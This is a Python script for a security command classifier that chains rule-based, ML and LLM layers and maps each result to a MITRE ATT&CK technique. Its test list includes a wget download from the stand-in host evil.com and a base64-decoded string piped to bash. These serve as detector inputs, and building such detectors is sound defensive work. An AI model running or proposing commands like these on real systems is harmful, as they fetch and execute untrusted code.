import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "ml_model"))
sys.path.append(os.path.join(os.path.dirname(__file__), "..", "llm_fallback"))

from rules import classify_rule_based
from ml_classifier import classify_ml
from llm_classifier import classify_llm
from mitre_map import map_to_mitre


def classify_command(command: str):
    """
    3-layer classification pipeline + MITRE ATT&CK tagging.
    Layer 1: Rules (fast/free) -> Layer 2: ML (fast/local) -> Layer 3: LLM (slow/API)
    """
    result = classify_rule_based(command)

    if not result:
        ml_result = classify_ml(command)
        if not ml_result["needs_escalation"]:
            result = ml_result
        else:
            result = classify_llm(command)

    mitre = map_to_mitre(result.get("label"))
    result["mitre_id"] = mitre["id"]
    result["mitre_name"] = mitre["name"]
    return result


if __name__ == "__main__":
    tests = [
        "wget http://evil.com/x.sh -O /tmp/x.sh",
        "ls -la",
        "systemctl restart nginx",
        "echo aGVsbG8= | base64 -d | bash",
    ]
    for t in tests:
        print(t, "->", classify_command(t))
